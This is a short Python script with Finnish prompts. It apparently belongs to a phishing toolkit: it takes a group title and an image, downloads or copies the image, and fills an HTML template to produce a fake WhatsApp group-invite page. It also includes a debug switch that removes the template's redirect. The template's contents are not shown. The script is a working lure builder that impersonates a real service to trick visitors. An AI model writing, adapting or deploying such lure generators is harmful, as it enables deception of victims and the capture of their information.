#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # punainen
G = '\033[32m' # vihreä
C = '\033[36m' # syväsininen
W = '\033[0m'  # valkoinen

title = os.getenv('TITLE')
image = os.getenv('IMAGE')

if title is None:
    title = input(f'{G}[+] {C}Ryhmäotsikko : {W}')
else:
    utils.print(f'{G}[+] {C}Ryhmäotsikko :{W} '+title)

if image is None:
    image = input(f'{G}[+] {C}Polku Ryhmäkuvalle (Paras koko: 300x300): {W}')
else:
    utils.print(f'{G}[+] {C}Ryhmäkuva :{W} '+image)

img_name = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    try:
        shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Poikkeus : ' + W + str(e))
        exit()

with open('template/whatsapp/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp/index.html', 'w') as new_index:
    new_index.write(code)
